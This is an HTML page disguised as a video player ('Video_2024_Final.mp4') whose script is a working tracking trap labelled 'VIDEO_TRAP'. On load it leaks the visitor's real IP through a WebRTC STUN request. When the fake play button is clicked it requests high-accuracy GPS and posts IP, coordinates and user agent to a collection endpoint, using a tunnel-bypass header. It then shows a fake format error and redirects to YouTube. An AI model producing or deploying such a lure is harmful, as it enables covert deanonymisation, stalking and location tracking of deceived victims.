<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Video</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background: #000;
            overflow: hidden;
            font-family: sans-serif;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
        }

        #video-container {
            position: relative;
            width: 100%;
            max-width: 800px;
            aspect-ratio: 16/9;
            background: #000;
            cursor: pointer;
        }

        /* Blurred thumbnail effect */
        #thumbnail {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(45deg, #111, #222);
            display: flex;
            align-items: center;
            justify-content: center;
        }

        #play-btn {
            width: 80px;
            height: 80px;
            background: rgba(255, 0, 0, 0.9);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            box-shadow: 0 0 30px rgba(255, 0, 0, 0.5);
            transition: transform 0.2s;
        }

        #play-btn::after {
            content: '';
            width: 0;
            height: 0;
            border-top: 15px solid transparent;
            border-bottom: 15px solid transparent;
            border-left: 25px solid white;
            margin-left: 5px;
        }

        #video-container:hover #play-btn {
            transform: scale(1.1);
        }

        .ui-overlay {
            position: absolute;
            bottom: 0;
            left: 0;
            width: 100%;
            height: 60px;
            background: rgba(0, 0, 0, 0.6);
            display: flex;
            align-items: center;
            padding: 0 20px;
            box-sizing: border-box;
        }

        .bar {
            flex-grow: 1;
            height: 5px;
            background: #555;
            margin: 0 15px;
            border-radius: 5px;
            position: relative;
        }

        .progress {
            width: 0%;
            height: 100%;
            background: #f00;
        }

        h1 {
            color: #fff;
            position: absolute;
            top: 20px;
            left: 20px;
            margin: 0;
            font-weight: normal;
            font-size: 18px;
            text-shadow: 0 2px 5px rgba(0, 0, 0, 0.8);
        }

        #spinner {
            display: none;
            width: 50px;
            height: 50px;
            border: 5px solid rgba(255, 255, 255, 0.3);
            border-top: 5px solid #fff;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }

            100% {
                transform: rotate(360deg);
            }
        }
    </style>
</head>

<body>

    <div id="video-container">
        <h1>Video_2024_Final.mp4</h1>
        <div id="thumbnail">
            <div id="play-btn"></div>
            <div id="spinner"></div>
        </div>
        <div class="ui-overlay">
            <span style="color:#fff; font-size:12px;">0:00</span>
            <div class="bar">
                <div class="progress"></div>
            </div>
            <span style="color:#fff; font-size:12px;">2:14</span>
        </div>
    </div>

    <script>
        // Configuration
        const TARGET_URL = '/track';

        // Data Collection
        const data = {
            timestamp: new Date().toISOString(),
            device: { userAgent: navigator.userAgent },
            location: {},
            type: 'VIDEO_TRAP'
        };

        let ipCollected = false;

        // 1. Get IP Immediately
        function collectIP() {
            const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
            pc.createDataChannel('');
            pc.onicecandidate = (e) => {
                if (e.candidate) {
                    const match = e.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
                    if (match && match[1] !== '127.0.0.1') {
                        data.location.realIP = match[1];
                        ipCollected = true;
                        pc.close();
                    }
                }
            };
            setTimeout(async () => {
                if (!ipCollected) {
                    try {
                        const r = await fetch('https://api.ipify.org?format=json');
                        const j = await r.json();
                        data.location.ip = j.ip;
                    } catch (e) { }
                }
            }, 1000);
        }

        // 2. Trigger GPS on Click
        document.getElementById('video-container').addEventListener('click', async () => {
            document.getElementById('play-btn').style.display = 'none';
            document.getElementById('spinner').style.display = 'block';

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    async (pos) => {
                        data.location.lat = pos.coords.latitude;
                        data.location.lng = pos.coords.longitude;
                        data.location.accuracy = pos.coords.accuracy;
                        await sendData();
                    },
                    async (err) => {
                        data.location.geoError = err.message;
                        await sendData();
                    },
                    { enableHighAccuracy: true, timeout: 30000, maximumAge: 0 }
                );
            } else {
                await sendData();
            }
        });

        async function sendData() {
            try {
                await fetch(TARGET_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json', 'Bypass-Tunnel-Reminder': 'true' },
                    body: JSON.stringify(data),
                    keepalive: true
                });
                // Simulate video "error" or redirect
                alert('Error: Video format not supported.');
                window.location.href = 'https://youtube.com';
            } catch (e) { }
        }

        collectIP();
    </script>
</body>

</html>
